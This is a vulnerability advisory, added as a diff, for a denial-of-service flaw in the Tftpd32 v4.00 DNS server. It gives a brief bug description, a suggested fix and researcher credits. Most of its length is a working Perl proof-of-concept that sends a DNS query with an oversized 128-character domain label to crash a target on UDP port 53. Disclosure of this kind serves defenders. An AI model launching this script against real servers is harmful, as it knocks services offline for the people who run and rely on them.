@@ -1,0 +1,77 @@
+Title: Tftpd32 DNS Server Denial Of Service Vulnerability
+Software : Tftpd32
+
+Software Version : v4.00
+
+Vendor: http://tftpd32.jounin.net/ 
+
+Vulnerability Published : 2012-05-26
+
+Vulnerability Update Time :
+
+Status : 
+
+Impact : Medium(CVSS2 Base : 5.0, AV:N/AC:L/Au:N/C:N/I:N/A:P)
+
+Bug Description :
+Tftpd32 is a free tftp and dns server for windows, freeware tftp server.
+And the dns server would bind udp port 53, but it does not validate the domain option size leading to a Denial Of Service flaw while sending more than 127 characters to it.
+
+Solution :
+The tftpd32's dns server can drop the evil request when it was detected the domain option size were longer than 127 characters.
+
+Proof Of Concept :
+-----------------------------------------------------------
+#!/usr/bin/perl
+use IO::Socket;
+use Socket;
+use Math::BigInt;
+$|=1;
+$host=shift;
+$port=shift || '53';
+die "usage: $0 \$host [\$port]\n" if(!defined($host));
+$target_ip = inet_aton($host);
+$target = sockaddr_in($port, $target_ip);
+$crash='A'x128;
+$transaction_id_count=1;
+sub dns_struct_pack($){
+  $domain=shift;                  #domain
+  $type="\x00\xff";               #dns_type = ANY
+  $transaction_id_count=1 if($transaction_id_count > 255);
+  $x=Math::BigInt->new($transaction_id_count);
+  $x=~s/0x//;
+  $transaction_id=sprintf("\x00".chr($x));
+  $flag="\x01\x00";
+  $question="\x00\x01";
+  $answer_rrs="\x00\x00";
+  $authority_rrs="\x00\x00";
+  $additional_rrs="\x00\x00";
+  if($domain ne '0'){
+    undef($domain_length);
+    $domain_length=length($domain);
+    $y=Math::BigInt->new($domain_length);
+    $y=~s/0x//;
+    $domain_length=chr($y);
+  }
+  $class="\x00\x01";                    #IN
+  $transaction_id_count++;
+  if($domain eq '0'){
+    $packet_struct="$transaction_id"."$flag"."$question"."$answer_rrs"."$authority_rrs"."$additional_rrs"."\x00"."$type"."$class";
+  }else{
+    $packet_struct="$transaction_id"."$flag"."$question"."$answer_rrs"."$authority_rrs"."$additional_rrs"."$domain_length"."$domain".
+    "\x00"."$type"."$class";
+  }    
+  return $packet_struct;
+}
+print "Launch attack ... ";
+socket(SOCK1, AF_INET, SOCK_DGRAM, 17);
+send(SOCK1, &dns_struct_pack($crash), 0, $target);
+close(SOCK1);
+print "Finish!\n";
+exit(0);
+-----------------------------------------------------------
+
+Credits : This vulnerability was discovered by demonalex(at)163(dot)com
+mail: demonalex(at)163(dot)com / ChaoYi.Huang@connect.polyu.hk
+Pentester/Researcher
+Dark2S Security Team/PolyU.HK
